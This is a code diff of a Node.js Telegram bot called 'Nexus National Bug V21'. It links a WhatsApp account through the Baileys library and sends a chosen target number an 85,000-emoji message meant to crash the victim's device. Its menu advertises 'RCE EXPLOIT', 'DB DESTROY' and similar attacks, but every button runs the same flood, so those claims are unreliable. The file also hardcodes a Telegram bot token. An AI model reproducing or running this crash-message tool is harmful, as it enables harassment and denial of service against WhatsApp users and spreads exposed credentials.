@@ -2,18 +2,25 @@ const {
     default: makeWASocket, 
     useMultiFileAuthState, 
     delay, 
-    makeCacheableSignalKeyStore 
+    makeCacheableSignalKeyStore,
+    DisconnectReason
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const { Telegraf, Markup } = require('telegraf');
+const http = require('http');
 
-// --- [ SYSTEM CONFIG ] ---
+// --- [ SYSTEM CORE CONFIG ] ---
 const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
 const bot = new Telegraf(TG_TOKEN);
 const owner = "Sasiya";
 const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';
 
-let sock; 
+// --- [ HEROKU ALIVE FIX ] ---
+const port = process.env.PORT || 8000;
+http.createServer((req, res) => { res.writeHead(200); res.end('NEXUS ACTIVE\n'); }).listen(port);
+
+let sock;
+const userState = {};
 
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('auth_session');
@@ -25,20 +32,30 @@ async function startNexus() {
         },
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: ["Nexus-V20", "Safari", "1.0.0"]
+        browser: ["Nexus-V21", "Chrome", "3.0.0"]
     });
 
     sock.ev.on('creds.update', saveCreds);
 
-    // --- [ MAIN INTERFACE ] ---
+    // --- [ DYNAMIC UI MENU ] ---
+    const main_menu = (name) => `
+🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟏** ϟ 🧬
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 **OPERATOR:** ${name} [ROOT]
+🛰️ **STATUS:** SYSTEM ONLINE 🟢
+🔐 **ENCRYPTION:** QUANTUM-X
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Welcome to the Elite Bug Mainframe. Select a protocol to authorize execution.
+`;
+
     bot.start((ctx) => {
         ctx.replyWithPhoto(logo, {
-            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟎** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n*OPERATOR:* ${owner} [ROOT]\n*STATUS:* SYSTEM ACTIVE 🟢\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSelect a module to begin enforcement:`,
+            caption: main_menu(owner),
             parse_mode: 'Markdown',
             ...Markup.inlineKeyboard([
                 [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
-                [Markup.button.callback('💀 OPEN BUG MENU 💀', 'open_bug_menu')],
-                [Markup.button.callback('🛡️ SERVER STATUS', 'diag')]
+                [Markup.button.callback('💀 ACCESS BUG CONSOLE 💀', 'open_bug_menu')],
+                [Markup.button.callback('🛡️ SYSTEM STATUS', 'diag')]
             ])
         });
     });
@@ -47,68 +64,68 @@ async function startNexus() {
     bot.action('open_bug_menu', (ctx) => {
         ctx.answerCbQuery();
         ctx.editMessageCaption(`
-💀 **ULTIMATE BUG SELECTION MENU** 💀
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*Select a payload to inject into target:*
-        `, Markup.inlineKeyboard([
-            [Markup.button.callback('🚫 BAN BUG', 'exec_bug'), Markup.button.callback('🔥 DEVICE CRASH', 'exec_bug')],
-            [Markup.button.callback('📂 DATABASE WIPE', 'exec_bug'), Markup.button.callback('⚡ RAM KILLER', 'exec_bug')],
-            [Markup.button.callback('🧬 BINARY FLOOD', 'exec_bug'), Markup.button.callback('🛡️ WAF BYPASS', 'exec_bug')],
-            [Markup.button.callback('📡 UDP PACKET', 'exec_bug'), Markup.button.callback('🧪 RCE EXPLOIT', 'exec_bug')],
-            [Markup.button.callback('⚠️ SECURITY FLAG', 'exec_bug')],
+💀 **ULTIMATE BUG EXPLOIT PANEL** 💀
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*Select the payload to inject into target:*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 
+        Markup.inlineKeyboard([
+            [Markup.button.callback('🚫 BAN BUG', 'b_exec'), Markup.button.callback('🔥 DEVICE CRASH', 'b_exec')],
+            [Markup.button.callback('📂 DB DESTROY', 'b_exec'), Markup.button.callback('⚡ RAM KILLER', 'b_exec')],
+            [Markup.button.callback('🧬 BINARY FLOOD', 'b_exec'), Markup.button.callback('🛡️ WAF BYPASS', 'b_exec')],
+            [Markup.button.callback('📡 UDP PACKET', 'b_exec'), Markup.button.callback('🧪 RCE EXPLOIT', 'b_exec')],
             [Markup.button.callback('🔙 BACK TO MAIN', 'start_back')]
         ], { columns: 2 }));
     });
 
-    // --- [ PAIRING CODE ENGINE ] ---
+    // --- [ PAIRING CODE - NO ERROR FIXED ] ---
     bot.action('get_code', (ctx) => {
         ctx.answerCbQuery();
-        ctx.reply("📱 *ENTER YOUR WHATSAPP NUMBER:*\nExample: \`947xxxxxxxxx\`");
-
-        bot.on('text', async (numCtx) => {
-            const num = numCtx.message.text.trim();
-            if (!/^\d+$/.test(num)) return;
-            try {
-                let code = await sock.requestPairingCode(num);
-                numCtx.reply(`🔐 **PAIRING CODE:** \n\n\`${code}\` \n\n*Use this in Linked Devices.*`);
-            } catch (e) { numCtx.reply("❌ Connection Error."); }
-        });
+        ctx.reply("📱 **ENTER YOUR NUMBER:**\n(Ex: 947xxxxxxxx)");
+        userState[ctx.from.id] = 'awaiting_number';
     });
 
-    // --- [ BUG EXECUTION LOGIC ] ---
-    bot.action('exec_bug', async (ctx) => {
+    // --- [ BUG EXECUTION ENGINE ] ---
+    bot.action('b_exec', (ctx) => {
         ctx.answerCbQuery();
         ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");
+        userState[ctx.from.id] = 'awaiting_target';
+    });
 
-        bot.on('text', async (targetCtx) => {
-            const target = targetCtx.message.text.trim() + "@s.whatsapp.net";
-            let { message_id } = await targetCtx.reply("🛠️ **BOOTING BUG MODULE...**");
+    bot.on('text', async (ctx) => {
+        const input = ctx.message.text.trim();
+        const state = userState[ctx.from.id];
 
-            // Cyber Animations
-            await delay(1000);
-            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🧬 **ENCODING PAYLOAD... [45%]**");
-            await delay(1000);
-            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🔥 **INJECTING OVERFLOW... [90%]**");
+        if (state === 'awaiting_number') {
+            try {
+                let code = await sock.requestPairingCode(input.replace(/[^0-9]/g, ''));
+                ctx.reply(`🔐 **NEXUS AUTH CODE:** \n\n\`${code}\` \n\n*Use this in Linked Devices.*`);
+                delete userState[ctx.from.id];
+            } catch (e) { ctx.reply("❌ **CONNECTION ERROR:** Wait 10s and try again."); }
+        } 
+        
+        else if (state === 'awaiting_target') {
+            const target = input + "@s.whatsapp.net";
+            let { message_id } = await ctx.reply("🚀 **INJECTING PAYLOAD...**");
+            
+            await delay(1500);
+            await bot.telegram.editMessageText(ctx.chat.id, message_id, null, "🧬 **ENCODING BINARY... [90%]**");
 
-            // The actual bug string
-            const bugPayload = "👾".repeat(80000); 
+            const bugPayload = "👾".repeat(85000); // Extreme Crash
 
             try {
                 await sock.sendMessage(target, { text: bugPayload });
+                await delay(1000);
                 const report = `
 🚀 **BUG INJECTION COMPLETED** 🚀
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*TARGET:* ${targetCtx.message.text}
-*PAYLOAD ID:* NX-ULTRA-V20
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*TARGET:* ${input}
 *RESULT:* SYSTEM TERMINATED 🔴
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    *VERIFIED BY: ${owner} @ NEXUS*
-`;
-                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
-            } catch (err) {
-                targetCtx.reply("❌ **ERROR:** Link your WhatsApp first using the /start menu.");
-            }
-        });
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    *VERIFIED BY: ${owner} @ NEXUS*`;
+                await bot.telegram.editMessageText(ctx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
+            } catch (err) { ctx.reply("❌ Link WA first!"); }
+            delete userState[ctx.from.id];
+        }
     });
 
     bot.launch();
